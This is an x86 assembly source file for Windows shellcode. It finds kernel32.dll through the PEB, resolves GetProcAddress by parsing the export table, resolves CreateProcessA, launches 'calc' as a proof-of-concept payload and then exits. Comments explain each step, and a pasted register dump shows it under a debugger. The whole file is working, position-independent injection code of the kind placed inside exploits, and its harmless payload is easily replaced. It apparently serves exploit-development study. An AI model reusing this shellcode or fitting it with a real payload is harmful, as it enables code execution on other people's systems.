global _start

section .text
_start:


getkernel32:
	xor ecx, ecx				; zeroing register ECX
	mul ecx						; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]	; PEB loaded in eax
	mov eax, [eax + 0x00c]		; LDR loaded in eax
	mov esi, [eax + 0x014]		; InMemoryOrderModuleList loaded in esi
	lodsd						; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd						; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]		; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]		; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]		; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]		; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx 							; ordinals increment
	lodsd								; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547			; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72	; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464	; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]		; offset ordinals
	add esi, ebx 				; pointer to the name ordinals table
	mov cx, [esi + ecx * 2] 	; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]    	; ESI = Offset address table
	add esi, ebx             	; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4] 	; EDX = Pointer(offset)
	add edx, ebx             	; EDX = getProcAddress
	mov ebp, edx 				; save getProcAddress in EBP for future purpose

getCreateProcessA:
	xor ecx, ecx 					; zeroing ECX
	push 0x61614173					; aaAs
	sub word [esp + 0x2], 0x6161 	; aaAs - aa
	push 0x7365636f 				; ecor
	push 0x72506574					; rPet
	push 0x61657243 				; aerC
	push esp 						; push the pointer to stack
	push ebx 						
	call edx 						; call getprocAddress

zero_memory:
	xor ecx, ecx                ; zero out counter register
    mov cl, 0xff                ; we'll loop 255 times (0xff)
    xor edi, edi                ; edi now 0x00000000

    zero_loop:
    push edi                    ; place 0x00000000 on stack 255 times as a way to 'zero memory' 
    loop zero_loop

getcalc:
	push 0x636c6163             ; 'calc'
    mov ecx, esp                ; stack pointer to 'calc'

    ; Registers situation at this point
	
	; EAX 75292062 kernel32.CreateProcessA
	; ECX 0022FB7C ASCII "calc"
	; EDX 75290000 kernel32.75290000
	; EBX 75290000 kernel32.75290000
	; ESP 0022FB7C ASCII "calc"
	; EBP 0022FF94
	; ESI 75344DD0 kernel32.75344DD0
	; EDI 00000000
	; EIP 00401088 get_calc.00401088

    push ecx                    ; processinfo pointing to 'calc' as a struct argument
    push ecx                    ; startupinfo pointing to 'calc' as a struct argument
    xor edx, edx                ; zero out
    push edx                    ; NULLS
    push edx
    push edx
    push edx
    push edx
    push edx
    push ecx                    ; 'calc'
    push edx
    call eax                    ; call CreateProcessA and spawn calc

getExitProcess:
	add esp, 0x010 				; clean the stack
	push 0x61737365				; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250				; corP
	push 0x74697845				; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax
